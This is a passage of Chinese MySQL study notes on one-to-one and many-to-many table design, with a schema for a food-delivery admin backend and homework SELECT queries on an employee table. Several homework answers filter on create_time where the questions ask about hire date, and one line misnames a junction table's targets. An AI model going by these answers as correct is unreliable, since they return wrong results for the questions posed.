<p>将大表中的一些<strong>基础字段</strong>放在一张表当中，将<strong>其他的字段</strong>放在另外一张表当中，以此来提高<strong>数据的操作效率</strong></p>
</li>
<li>
<p>应用场景：用户表(基本信息+身份信息)</p>
<ul>
<li><code>基本信息</code>：用户的ID、姓名、性别、手机号、学历</li>
<li><code>身份信息</code>：民族、生日、身份证号、身份证签发机关，身份证的有效期(开始时间、结束时间)</li>
</ul>
<blockquote>
<p>业务系统中，对用户基本信息查询频率特别的高，但是对于用户身份信息查询频率很低</p>
<p>此时出于提高查询效率的考虑，我就可以将这张大表拆分成两张小表</p>
<p>第一张表存放的是用户的基本信息，而第二张表存放的就是用户的身份信息</p>
<p>他们两者之间一对一的关系，一个用户只能对应一个身份证，而一个身份证也只能关联一个用户</p>
</blockquote>
</li>
<li>
<p><strong>一对一</strong> ：在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的(UNIQUE)</p>
<blockquote>
<p>一对一是特殊的多对一</p>
</blockquote>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 用户基本信息表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">    id <span class="type">int</span> unsigned  <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    gender tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;性别, 1 男  2 女&#x27;</span>,</span><br><span class="line">    phone <span class="type">char</span>(<span class="number">11</span>) comment <span class="string">&#x27;手机号&#x27;</span>,</span><br><span class="line">    degree <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;学历&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;用户基本信息表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 测试数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;白眉鹰王&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;18812340001&#x27;</span>,<span class="string">&#x27;初中&#x27;</span>),</span><br><span class="line">                        (<span class="number">2</span>,<span class="string">&#x27;青翼蝠王&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;18812340002&#x27;</span>,<span class="string">&#x27;大专&#x27;</span>),</span><br><span class="line">                        (<span class="number">3</span>,<span class="string">&#x27;金毛狮王&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;18812340003&#x27;</span>,<span class="string">&#x27;初中&#x27;</span>),</span><br><span class="line">                        (<span class="number">4</span>,<span class="string">&#x27;紫衫龙王&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;18812340004&#x27;</span>,<span class="string">&#x27;硕士&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 用户身份信息表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user_card(</span><br><span class="line">    id <span class="type">int</span> unsigned  <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    nationality <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;民族&#x27;</span>,</span><br><span class="line">    birthday <span class="type">date</span> <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;生日&#x27;</span>,</span><br><span class="line">    idcard <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;身份证号&#x27;</span>,</span><br><span class="line">    issued <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;签发机关&#x27;</span>,</span><br><span class="line">    expire_begin <span class="type">date</span> <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;有效期限-开始&#x27;</span>,</span><br><span class="line">    expire_end <span class="type">date</span> comment <span class="string">&#x27;有效期限-结束&#x27;</span>,</span><br><span class="line">    user_id <span class="type">int</span> unsigned <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line">    <span class="keyword">constraint</span> fk_user_id <span class="keyword">foreign</span> key (user_id) <span class="keyword">references</span> tb_user(id)</span><br><span class="line">) comment <span class="string">&#x27;用户身份信息表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 测试数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user_card <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;汉&#x27;</span>,<span class="string">&#x27;1960-11-06&#x27;</span>,<span class="string">&#x27;100000100000100001&#x27;</span>,<span class="string">&#x27;朝阳区公安局&#x27;</span>,<span class="string">&#x27;2000-06-10&#x27;</span>,<span class="keyword">null</span>,<span class="number">1</span>),</span><br><span class="line">        (<span class="number">2</span>,<span class="string">&#x27;汉&#x27;</span>,<span class="string">&#x27;1971-11-06&#x27;</span>,<span class="string">&#x27;100000100000100002&#x27;</span>,<span class="string">&#x27;静安区公安局&#x27;</span>,<span class="string">&#x27;2005-06-10&#x27;</span>,<span class="string">&#x27;2025-06-10&#x27;</span>,<span class="number">2</span>),</span><br><span class="line">        (<span class="number">3</span>,<span class="string">&#x27;汉&#x27;</span>,<span class="string">&#x27;1963-11-06&#x27;</span>,<span class="string">&#x27;100000100000100003&#x27;</span>,<span class="string">&#x27;昌平区公安局&#x27;</span>,<span class="string">&#x27;2006-06-10&#x27;</span>,<span class="keyword">null</span>,<span class="number">3</span>),</span><br><span class="line">        (<span class="number">4</span>,<span class="string">&#x27;回&#x27;</span>,<span class="string">&#x27;1980-11-06&#x27;</span>,<span class="string">&#x27;100000100000100004&#x27;</span>,<span class="string">&#x27;海淀区公安局&#x27;</span>,<span class="string">&#x27;2008-06-10&#x27;</span>,<span class="string">&#x27;2028-06-10&#x27;</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<h3 id="多对多"><a class="header-anchor" href="#多对多">¶</a>多对多</h3>
<ul>
<li>实现：
<ul>
<li>建立<strong>第三张中间表</strong>，中间表至少包含<strong>两个外键</strong>，分别<strong>关联两方主键</strong></li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 学生表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_student(</span><br><span class="line">    id <span class="type">int</span> auto_increment <span class="keyword">primary</span> key comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    <span class="keyword">no</span> <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;学号&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;学生表&#x27;</span>;</span><br><span class="line"><span class="comment">-- 学生表测试数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_student(name, <span class="keyword">no</span>) <span class="keyword">values</span> (<span class="string">&#x27;黛绮丝&#x27;</span>, <span class="string">&#x27;2000100101&#x27;</span>),(<span class="string">&#x27;谢逊&#x27;</span>, <span class="string">&#x27;2000100102&#x27;</span>),(<span class="string">&#x27;殷天正&#x27;</span>, <span class="string">&#x27;2000100103&#x27;</span>),(<span class="string">&#x27;韦一笑&#x27;</span>, <span class="string">&#x27;2000100104&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 课程表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_course(</span><br><span class="line">   id <span class="type">int</span> auto_increment <span class="keyword">primary</span> key comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">   name <span class="type">varchar</span>(<span class="number">10</span>) comment <span class="string">&#x27;课程名称&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;课程表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 课程表测试数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_course (name) <span class="keyword">values</span> (<span class="string">&#x27;Java&#x27;</span>), (<span class="string">&#x27;PHP&#x27;</span>), (<span class="string">&#x27;MySQL&#x27;</span>) , (<span class="string">&#x27;Hadoop&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 学生课程表（中间表）</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_student_course(</span><br><span class="line">   id <span class="type">int</span> auto_increment comment <span class="string">&#x27;主键&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">   student_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;学生ID&#x27;</span>,</span><br><span class="line">   course_id  <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;课程ID&#x27;</span>,</span><br><span class="line">   <span class="keyword">constraint</span> fk_courseid <span class="keyword">foreign</span> key (course_id) <span class="keyword">references</span> tb_course (id),</span><br><span class="line">   <span class="keyword">constraint</span> fk_studentid <span class="keyword">foreign</span> key (student_id) <span class="keyword">references</span> tb_student (id)</span><br><span class="line">)comment <span class="string">&#x27;学生课程中间表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 学生课程表测试数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_student_course(student_id, course_id) <span class="keyword">values</span> (<span class="number">1</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">2</span>),(<span class="number">1</span>,<span class="number">3</span>),(<span class="number">2</span>,<span class="number">2</span>),(<span class="number">2</span>,<span class="number">3</span>),(<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<h3 id="案例-v2"><a class="header-anchor" href="#案例-v2">¶</a>案例</h3>
<ul>
<li>
<p>需求：根据参考资料中提供的《<a href="https://app.mockplus.cn/app/share-e928208474edd220b75e9faff1380e4ashare-VaH7dpoIaqRr/preview/BlJ_BHC42AEaa/tKNB7Tamh14B54?allowShare=1&amp;cps=expand&amp;ha=1">苍穹外卖_管理后台</a>页面原型，设计分类管理、菜品管理、套餐管理模块的表结构</p>
</li>
<li>
<p>步骤：</p>
<ul>
<li>阅读<strong>页面原型及需求文档</strong>，分析各个模块涉及到的<strong>表结构</strong>，及<strong>表结构之间的关系</strong></li>
<li>根据页面原型及需求文档，分析各个表结构中<strong>具体的字段及约束</strong></li>
</ul>
</li>
<li>
<p>分析</p>
<ul>
<li>
<p>页面原型-分类管理</p>
<blockquote>
<p>分类的信息：分类名称、分类类型[菜品/套餐]、分类排序、分类状态[禁用/启用]、分类的操作时间(修改时间)</p>
</blockquote>
</li>
<li>
<p>页面原型-菜品管理</p>
<blockquote>
<p>菜品的信息：菜品名称、菜品图片、菜品分类、菜品售价、菜品售卖状态、菜品的操作时间(修改时间)</p>
<p>思考：分类与菜品之间是什么关系？</p>
<ul>
<li>一对多关系。一个分类下会有多个菜品，而一个菜品只能归属一个分类</li>
</ul>
<p>设计表原则：在多的一方，添加字段，关联属于一这方的主键</p>
</blockquote>
</li>
<li>
<p>页面原型-套餐管理</p>
<blockquote>
<p>套餐的信息：套餐名称、套餐图片、套餐分类、套餐价格、套餐售卖状态、套餐的操作时间</p>
<p>思考：套餐与菜品之间是什么关系？</p>
<ul>
<li>多对多关系。一个套餐下会有多个菜品，而一个菜品也可以出现在多个套餐中</li>
</ul>
<p>设计表原则：创建第三张中间表，建立两个字段分别关联菜品表的主键和套餐表的主键</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分析页面原型及需求文档后:</span><br><span class="line">- 【分类表】</span><br><span class="line">  - [业务字段]：分类名称、分类类型、分类排序、分类状态</span><br><span class="line">  - [基础字段]：id(主键)、分类的创建时间、分类的修改时间</span><br><span class="line">  </span><br><span class="line">- 【菜品表】</span><br><span class="line">  - [业务字段]：菜品名称、菜品图片、菜品分类、菜品售价、菜品售卖状态</span><br><span class="line">  - [基础字段]：id(主键)、分类的创建时间、分类的修改时间</span><br><span class="line">  </span><br><span class="line">- 【套餐表】</span><br><span class="line">  - [业务字段]：套餐名称、套餐图片、套餐分类、套餐价格、套餐售卖状态</span><br><span class="line">  - [基础字段]：id(主键)、分类的创建时间、分类的修改时间</span><br><span class="line">  </span><br><span class="line">表结构之间的关系：</span><br><span class="line">- 分类表 - 菜品表 ： *一对多*</span><br><span class="line">  - 在菜品表中添加字段(菜品分类)，关联分类表 </span><br><span class="line">- 菜品表 - 套餐表 ： *多对多*</span><br><span class="line">  - 创建第三张中间表(套餐菜品关联表)，在中间表上添加两个字段(菜品id、套餐id)，分别关联菜品表和分类表</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<h4 id="表结构"><a class="header-anchor" href="#表结构">¶</a>表结构</h4>
<ul>
<li>分类表：category
<ul>
<li>业务字段：分类名称、分类类型、分类排序、分类状态</li>
<li>基础字段：id(主键)、创建时间、修改时间</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 分类表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> category</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">20</span>)      <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;分类名称&#x27;</span>,</span><br><span class="line">    type        tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;类型 1 菜品分类 2 套餐分类&#x27;</span>,</span><br><span class="line">    sort        tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;顺序&#x27;</span>,</span><br><span class="line">    status      tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="number">0</span> comment <span class="string">&#x27;状态 0 禁用，1 启用&#x27;</span>,</span><br><span class="line">    create_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;菜品及套餐分类&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>菜品表：dish
<ul>
<li>业务字段：菜品名称、菜品图片、菜品分类、菜品售价、菜品售卖状态</li>
<li>基础字段：id(主键)、分类的创建时间、分类的修改时间</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 菜品表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dish</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">20</span>)      <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;菜品名称&#x27;</span>,</span><br><span class="line">    category_id <span class="type">int</span> unsigned     <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;菜品分类ID&#x27;</span>,   <span class="comment">-- 逻辑外键</span></span><br><span class="line">    price       <span class="type">decimal</span>(<span class="number">8</span>, <span class="number">2</span>)    <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;菜品价格&#x27;</span>,</span><br><span class="line">    image       <span class="type">varchar</span>(<span class="number">300</span>)     <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;菜品图片&#x27;</span>,</span><br><span class="line">    description <span class="type">varchar</span>(<span class="number">200</span>) comment <span class="string">&#x27;描述信息&#x27;</span>,</span><br><span class="line">    status      tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="number">0</span> comment <span class="string">&#x27;状态, 0 停售 1 起售&#x27;</span>,</span><br><span class="line">    create_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;菜品&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>套餐表：setmeal
<ul>
<li>业务字段：套餐名称、套餐图片、套餐分类、套餐价格、套餐售卖状态</li>
<li>基础字段：id(主键)、分类的创建时间、分类的修改时间</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 套餐表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> setmeal</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">20</span>)      <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;套餐名称&#x27;</span>,</span><br><span class="line">    category_id <span class="type">int</span> unsigned     <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;分类id&#x27;</span>,       <span class="comment">-- 逻辑外键</span></span><br><span class="line">    price       <span class="type">decimal</span>(<span class="number">8</span>, <span class="number">2</span>)    <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;套餐价格&#x27;</span>,</span><br><span class="line">    image       <span class="type">varchar</span>(<span class="number">300</span>)     <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;图片&#x27;</span>,</span><br><span class="line">    description <span class="type">varchar</span>(<span class="number">200</span>) comment <span class="string">&#x27;描述信息&#x27;</span>,</span><br><span class="line">    status      tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="number">0</span> comment <span class="string">&#x27;状态 0:停用 1:启用&#x27;</span>,</span><br><span class="line">    create_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;套餐&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>套餐菜品关联表：setmeal_dish</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 套餐菜品关联表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> setmeal_dish</span><br><span class="line">(</span><br><span class="line">    id         <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    setmeal_id <span class="type">int</span> unsigned     <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;套餐id &#x27;</span>,    <span class="comment">-- 逻辑外键</span></span><br><span class="line">    dish_id    <span class="type">int</span> unsigned     <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;菜品id&#x27;</span>,     <span class="comment">-- 逻辑外键</span></span><br><span class="line">    copies     tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;份数&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;套餐菜品关联表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Day07–作业-v2"><a class="header-anchor" href="#Day07–作业-v2">¶</a>Day07–作业</h2>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/SCaAdNynuoOSj6xmDrhcUmSAnnf">‍⁠﻿﻿‍‬‍‌‌‌‌‌‬﻿‬‍‬⁠‬‬﻿﻿‍‍‍‍‍‬Day07-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="作业1"><a class="header-anchor" href="#作业1">¶</a>作业1</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 查询指定字段 name,entrydate 并返回</span></span><br><span class="line"><span class="keyword">select</span> name, entrydate <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 查询返回所有字段 （两种写法哦）</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp;</span><br><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 查询所有员工的 name,entrydate, 并起别名 (姓名、入职日期)</span></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> 姓名, entrydate <span class="keyword">as</span> 入职日期 <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 查询已有的员工关联了 哪几种 职位(不要重复)</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 查询 姓名 为 &#x27;杨逍&#x27; 的员工</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;杨逍&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 查询在 id小于等于5 的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> id <span class="operator">&lt;=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 7. 查询 没有分配职位 的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> job <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">-- 注意：应该使用 IS NULL 而不是 = null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 8. 查询 有职位 的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> job <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 9. 查询 密码不等于 &#x27;123456&#x27; 的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> password <span class="operator">!=</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 10. 查询入职日期 在 &#x27;2000-01-01&#x27; (包含) 到 &#x27;2010-01-01&#x27;(包含) 之间的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> create_time <span class="keyword">between</span> <span class="string">&#x27;2000-01-01&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;2010-01-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 11. 查询 入职时间 在 &#x27;2000-01-01&#x27; (包含) 到 &#x27;2010-01-01&#x27;(包含) 之间 且 性别为女 的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> create_time <span class="keyword">between</span> <span class="string">&#x27;2000-01-01&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;2010-01-01&#x27;</span> <span class="keyword">and</span> gender<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 12. 查询 职位是 2 (讲师) 或 3 (学工主管) 或 4 (教研主管) 的员工信息（两种写法实现）</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> job<span class="operator">=</span><span class="number">2</span> <span class="keyword">or</span> job<span class="operator">=</span><span class="number">3</span> <span class="keyword">or</span> job<span class="operator">=</span><span class="number">4</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> job <span class="keyword">in</span> (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 13. 查询姓名为两个字的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;__&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 14. 查询姓 &#x27;张&#x27; 的员工信息  且  入职时间在 &#x27;2008-01-01&#x27; 之后入职的员工</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;张%&#x27;</span> <span class="keyword">and</span> create_time <span class="operator">&gt;</span> <span class="string">&#x27;2008-01-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 15. 查询出 性别为 男 , 或 入职时间在 2010-01-01 之后入职的员工</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> gender<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> create_time <span class="operator">&gt;</span> <span class="string">&#x27;2010-01-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 16. 根据性别分组 , 统计男性和女性员工的数量 (结果展示时, 性别不能展示 1 或 2 , 要转化为 男 或 女 )</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    <span class="keyword">case</span></span><br><span class="line">        <span class="keyword">when</span> gender <span class="operator">=</span> <span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;男&#x27;</span></span><br><span class="line">        <span class="keyword">when</span> gender <span class="operator">=</span> <span class="number">2</span> <span class="keyword">then</span> <span class="string">&#x27;女&#x27;</span></span><br><span class="line">    <span class="keyword">end</span> <span class="keyword">as</span> gender,</span><br><span class="line">    <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> employee_count</span><br><span class="line"><span class="keyword">from</span> tb_emp <span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 17. 先查询入职时间在 &#x27;2015-01-01&#x27; (包含) 以前的员工 , 并对结果根据职位分组 , 获取员工数量大于等于2的职位</span></span><br><span class="line"><span class="keyword">select</span> job, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> employee_count</span><br><span class="line"><span class="keyword">from</span> tb_emp <span class="keyword">where</span> create_time <span class="operator">&lt;=</span> <span class="string">&#x27;2015-01-01&#x27;</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> job <span class="keyword">having</span> employee_count <span class="operator">&gt;=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 18. 查询所有的性别为男(gender 为 1)的 讲师 (job 为 2) , 并根据入职时间, 对员工进行升序排序</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> gender<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> job<span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">asc</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 19. 根据 入职时间 对公司的员工进行 升序排序 ， 入职时间相同 , 再按照 ID 进行降序排序</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">asc</span>, id <span class="keyword">desc</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 10. 查询性别为男(gender 为 1)的员工, 并根据 入职时间 对公司的员工进行 升序排序 ， 入职时间相同 , 再按照 ID 进行降序排序</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> gender<span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">asc</span>, id <span class="keyword">desc</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 21. 查询性别为男(gender 为 1)的员工 且 在 &#x27;2018-10-01&#x27; 之前入职的员工, 并根据 入职时间 对公司的员工进行 升序排序 ， 入职时间相同 , 再按照 ID 进行降序排序</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> gender<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> create_time <span class="operator">&lt;</span> <span class="string">&#x27;2018-10-01&#x27;</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">asc</span>, id <span class="keyword">desc</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 22. 查询姓 &#x27;张&#x27; 且 在 &#x27;2018-10-01&#x27; 之前入职的员工, 并根据入职时间进行升序排序, 并对结果分页操作, 展示第1页员工数据, 